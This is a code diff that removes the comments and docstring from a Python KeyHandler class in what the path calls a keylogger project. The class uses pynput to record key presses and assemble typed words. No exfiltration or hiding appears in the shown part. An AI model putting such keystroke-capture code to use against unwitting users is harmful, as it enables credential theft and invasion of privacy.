@@ -1,4 +1,3 @@
-# keylogger/handlers.py
 from pynput import keyboard
 
 class KeyHandler:
@@ -7,22 +6,15 @@ class KeyHandler:
         self.key_count = 0
 
     def process_key(self, key):
-        """
-        Process a key press.
-        Returns: (log_entry, completed_word, should_stop)
-        """
         try:
-            # Normal character
             char = key.char
             self.key_count += 1
             self.current_word += char
             return char, None, False
         except AttributeError:
-            # Special key
             key_name = self._get_key_name(key)
             self.key_count += 1
 
-            # Handle special keys with word completion
             if key == keyboard.Key.space:
                 word = self.current_word
                 self.current_word = ""
@@ -44,7 +36,6 @@ class KeyHandler:
                 self.current_word = ""
                 return "[ESC]", word, True
             else:
-                # Other special keys (no word completion)
                 return key_name, None, False
 
     def _get_key_name(self, key):
